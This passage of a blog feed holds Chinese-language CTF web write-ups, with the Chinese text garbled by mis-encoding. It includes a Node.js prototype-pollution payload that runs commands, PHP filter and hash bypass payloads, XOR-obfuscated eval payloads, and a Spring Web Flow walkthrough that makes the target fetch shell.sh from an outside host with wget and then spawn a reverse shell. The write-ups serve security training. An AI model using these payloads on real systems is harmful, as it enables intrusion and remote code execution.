class="token operator">==</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>passwd<span class="token punctuation">)</span><span class="token punctuation">{</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isLogin<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('error passwd');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯ä»¥çœ‹åˆ°éªŒè¯äº†æ³¨å†Œçš„ç”¨æˆ·åä¸èƒ½ä¸ºadminï¼ˆå¤§å°å†™ï¼‰ï¼Œä¸è¿‡æœ‰ä¸ªåœ°æ–¹å¯ä»¥æ³¨æ„åˆ°</p><pre><code>'user':req.body.userid.toUpperCase(),</code></pre><pre class=" language-js"><code class="language-js">router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span>res<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>æ³¨å†ŒadmÄ±nè´¦å·</p><p>ä¹Ÿå°±æ˜¯å¯ä»¥é€šè¿‡æ±¡æŸ“<code>outputFunctionName</code>è¿›è¡ŒSSTI</p><p>äºŽæ˜¯æŠ“<code>/action</code>çš„åŒ…ï¼Œ<code>Content-Type</code>è®¾ä¸º<code>application/json</code></p><p><strong>payload</strong></p><pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span><span class="token string">"lua"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"outputFunctionName"</span><span class="token punctuation">:</span>"a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">return</span> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//"},"Submit":""}</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> jsåŽŸåž‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW2019ï¼šWeb_Unagi</title>
      <link href="2021/10/12/csaw2019-web-unagi/"/>
      <url>2021/10/12/csaw2019-web-unagi/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/12/csaw2019-web-unagi/image-20211012111131352.png" alt="image-20211012111131352"></p><p><img src="/2021/10/12/csaw2019-web-unagi/image-20211012111138400.png" alt="image-20211012111138400"></p><p><img src="/2021/10/12/csaw2019-web-unagi/image-20211012111157678.png" alt="image-20211012111157678"></p><p>XXEç¼–ç è½¬æ¢ä¸ºUTF-16ç»•è¿‡</p><pre><code>iconv -f utf8 -t utf-16 2.xml&gt;1.xml</code></pre><p><img src="/2021/10/12/csaw2019-web-unagi/image-20211012111418969.png" alt="image-20211012111418969"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringWebFlow</title>
      <link href="2021/10/10/springwebflow/"/>
      <url>2021/10/10/springwebflow/</url>
      
        <content type="html"><![CDATA[<p><a href="https://lxh3ng.github.io/2021/10/08/he-cheng-bei-2021/">https://lxh3ng.github.io/2021/10/08/he-cheng-bei-2021/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é¹¤åŸŽæ¯2021</title>
      <link href="2021/10/08/he-cheng-bei-2021/"/>
      <url>2021/10/08/he-cheng-bei-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="MIDDLE-MAGIC"><a href="#MIDDLE-MAGIC" class="headerlink" title="MIDDLE_MAGIC"></a>MIDDLE_MAGIC</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">"./flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">"./result.php"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/^(.*)level(.*)$/'</span><span class="token punctuation">,</span> <span class="token string">'${1}&lt;!-- filtered -->${2}'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/pass_the_level_1#/'</span><span class="token punctuation">,</span> <span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"here is level 2"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token keyword">echo</span> <span class="token string">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// START FORM PROCESSING    </span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">"here is level 3,do you kown how to overcome it?"</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token variable">$level_3</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level_3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">result</span> <span class="token operator">==</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">echo</span> <span class="token string">"success:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">else</span> <span class="token punctuation">{</span>                            <span class="token keyword">echo</span> <span class="token string">"you never beat me!"</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span><span class="token punctuation">{</span>                        <span class="token keyword">echo</span> <span class="token string">"out"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// perform validations on the form data</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'&lt;p>out!&lt;/p>'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'nonono!'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;hr>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>%0aç»•è¿‡preg_replace</li><li>æ•°ç»„ç»•è¿‡sha1</li><li>è‹¥æ¯”è¾ƒ=0ç»•è¿‡json_decode</li></ul><p><strong>payload</strong></p><pre><code>?aaa=%0apass_the_level_1#POST:admin[]=1&amp;root_pwd[]=2&amp;level_3={"result":0}</code></pre><h1 id="EASYP"><a href="#EASYP" class="headerlink" title="EASYP"></a>EASYP</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'utils.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$guess</span> <span class="token operator">===</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong. Try Again'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/utils\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/show_source/'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p> å¤§Eäº†å¤ªä¹…äº†å¿˜äº†ï¼š</p><p>åŽŸé¢˜ï¼š<a href="https://buuoj.cn/challenges#[ISITDTU%202019]EasyPHP">https://buuoj.cn/challenges#[ISITDTU%202019]EasyPHP</a></p><p><a href="https://www.gem-love.com/ctf/1898.html">https://www.gem-love.com/ctf/1898.html</a></p><p><code>basename()</code> æ˜¯ä¸ºäº†è·¨ç›®å½•è¯»æ–‡ä»¶</p><pre><code>#Author:é¢–å¥‡L'Amore www.gem-love.comimport requestsfor i in range (0,500):    url = 'http://3.112.201.75:8003/index.php/config.php/{}?source'.format(hex(i).replace('0x', '%'))    r = requests.get(url)    if r"zer0pts" in r.text:        print(url)        print(r.content)        break</code></pre><pre><code>%81?%73%68%6f%77%5f%73%6f%75%72%63%65=1</code></pre><h1 id="Spring-Xman2017åŽŸé¢˜"><a href="#Spring-Xman2017åŽŸé¢˜" class="headerlink" title="Spring(Xman2017åŽŸé¢˜)"></a>Spring(Xman2017åŽŸé¢˜)</h1><p>åå¼¹shell</p><p><a href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p><p>1.ç‚¹å‡»é¡µé¢ä¸­çš„è¶…é“¾æŽ¥è¿›å…¥å›¾ä¹¦æœç´¢é¡µé¢ï¼Œåœ¨é¡µé¢ä¸­è¾“å…¥æœç´¢å†…å®¹è¿›è¡Œæœç´¢</p><p><img src="/2021/10/08/he-cheng-bei-2021/1.png" alt="1"></p><p>2.æœç´¢åˆ°å›¾ä¹¦ç‚¹å‡»View hotelæŒ‰é’®ï¼Œç„¶åŽç‚¹å‡»Book hotelæŒ‰é’®ï¼Œå¦‚æžœæ²¡æœ‰ç™»å½•è¯·å…ˆç™»å½•ï¼ˆç™»å½•åå¯†ç åœˆå‡ºæ¥äº†ï¼Œ4ç§ä»»æ„éƒ½å¯ä»¥ç™»å½•ï¼‰</p><p><img src="/2021/10/08/he-cheng-bei-2021/2.png" alt="2"></p><p>3.è¿›å…¥å€Ÿä¹¦é¡µé¢ï¼Œéšæ„å†™å…¥16ä½Credit Card idå’ŒCredit Card Nameç‚¹å‡»ProcessæŒ‰é’®</p><p><img src="/2021/10/08/he-cheng-bei-2021/3.png" alt="3"></p><p>4.åœ¨ç‚¹å‡»ConfirmæŒ‰é’®å‰æˆ‘ä»¬éœ€è¦è¿›è¡Œburpsuiteè¿›è¡Œæ‹¦æˆªæŠ“åŒ…ï¼ŒæˆªèŽ·æ•°æ®åŒ…send to repeaterï¼Œç¯¡æ”¹æ•°æ®åŒ…æ·»åŠ æ¶æ„payloadï¼š<code>&amp;_(new+java.lang.ProcessBuilder("/usr/bin/wget","-P/tmp","http://192.168.159.128/shell.sh")).start()=feifei</code>ï¼Œshell.shæ”¾åœ¨å¯ä»¥è®¿é—®çš„æœåŠ¡å™¨ä¸­ï¼Œæ‰§è¡Œè¯·æ±‚åŒ…ã€‚</p><p><img src="/2021/10/08/he-cheng-bei-2021/4.png" alt="4"></p><p>5.æŸ¥çœ‹è‡ªå·±è™šæ‹Ÿæœºçš„/tmpç›®å½•ä¸‹æœ‰æ²¡æœ‰æˆåŠŸä¸‹shell.sh,å¯ä»¥çœ‹åˆ°shell.shæˆåŠŸä¸‹è½½</p><p><img src="/2021/10/08/he-cheng-bei-2021/5.png" alt="5"></p><p>6.è‡³æ­¤å·²ç»å¤çŽ°äº†æ¼æ´žï¼Œå¯æ˜¯æˆ‘ä»¬æ—¢ç„¶æƒ³ä»£ç æ‰§è¡Œï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œåå¼¹shellæ“ä½œï¼Œç»§ç»­æ‰§è¡Œå‘½ä»¤ï¼Œæ·»åŠ payloadï¼š<code>&amp;_(new+java.lang.ProcessBuilder("/bin/chmod","777","/tmp/shell.sh")).start()=feifei</code>å¯¹shell.shä¿®æ”¹æƒé™</p><p><img src="/2021/10/08/he-cheng-bei-2021/6.png" alt="6"></p><p>7.æŸ¥çœ‹è™šæ‹Ÿæœºä¸­çš„/tmpç›®å½•ä¸‹çš„shell.shæœ‰æ²¡æœ‰å˜æˆå¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™ï¼Œå¯ä»¥çœ‹åˆ°shell.shæƒé™æˆåŠŸå˜æˆ777</p><p><img src="/2021/10/08/he-cheng-bei-2021/7.png" alt="7"></p><p>8.æ‰§è¡Œshell.shæ–‡ä»¶åŒæ—¶ç›‘å¬2333ç«¯å£ï¼Œæ‰§è¡Œpayload:<code>&amp;_(new+java.lang.ProcessBuilder("/bin/bash","/tmp/shell.sh")).start()=feifei</code></p><p><img src="/2021/10/08/he-cheng-bei-2021/8.png" alt="8"></p><p><img src="/2021/10/08/he-cheng-bei-2021/9.png" alt="9"></p><p>9.åœ¨ç›‘å¬çš„æœåŠ¡å™¨ä¸­æŸ¥çœ‹ç›‘å¬çš„2333ç«¯å£æœ‰æ²¡æœ‰åå¼¹shellï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸåå¼¹shellï¼Œå¯ä»¥æ‰§è¡Œæƒé™å†…ä»»æ„å‘½ä»¤ã€‚ </p><p><img src="/2021/10/08/he-cheng-bei-2021/10.png" alt="10"></p><h2 id="ä¿®å¤æ„è§"><a href="#ä¿®å¤æ„è§" class="headerlink" title="ä¿®å¤æ„è§"></a>ä¿®å¤æ„è§</h2><p>â€ƒâ€ƒå‡çº§Spring Web Flowç‰ˆæœ¬åˆ°4.2.5</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ISITDTU2019ï¼šEasyPHP</title>
      <link href="2021/10/07/isitdtu2019-easyphp/"/>
      <url>2021/10/07/isitdtu2019-easyphp/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9\'"`$&amp;.,|[{_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'rosÃ© will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><p>preg_match(â€˜/[\x00- 0-9'â€œ`$&amp;.,|[{<em>defgops\x7F]+/iâ€™, $</em>)Jè§£æžï¼š</p></li><li><pre><code>\x00- 0-9                       åŒ¹é…\x00åˆ°ç©ºæ ¼(\x20)ï¼Œ0-9çš„æ•°å­—'"`$&amp;.,|[{_defgops              åŒ¹é…è¿™äº›å­—ç¬¦\x7F                            åŒ¹é…DEL(\x7F)å­—ç¬¦</code></pre></li><li><p>if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )</p></li><li><p>é™å®šæäº¤çš„å­—ç¬¦ä¸²é•¿åº¦å°äºŽ13</p></li></ul><p>æŸ¥çœ‹å¯ä»¥æäº¤çš„å‡½æ•°ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$array</span><span class="token operator">=</span><span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¿”å›žæ‰€æœ‰å†…ç½®å®šä¹‰å‡½æ•°</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">'internal'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9\'"\`$&amp;.,|[{_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">.</span><span class="token string">'&lt;br/>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æžœ</span>bcmulrtrimtrimltrimchrlinkunlinktanatanatanhtanhintvalmailminmaxvirtual</code></pre><pre><code>urlencode(~'phpinfo');</code></pre><p><img src="/2021/10/07/isitdtu2019-easyphp/image-20211007212315111.png" alt="image-20211007212315111"></p><p>disable_functions:</p><pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,</code></pre><pre><code>print_r(scandir('.'));=((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></pre><pre><code>print_r(scandir(.));=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></pre><pre><code>show_source(end(scandir(.)));=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELSï¼š2019-EzPOP</title>
      <link href="2021/10/06/els-2019-ezpop/"/>
      <url>2021/10/06/els-2019-ezpop/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string">'path'</span><span class="token punctuation">,</span> <span class="token string">'dirname'</span><span class="token punctuation">,</span> <span class="token string">'basename'</span><span class="token punctuation">,</span> <span class="token string">'extension'</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">,</span>            <span class="token string">'size'</span><span class="token punctuation">,</span> <span class="token string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string">'visibility'</span><span class="token punctuation">,</span> <span class="token string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token 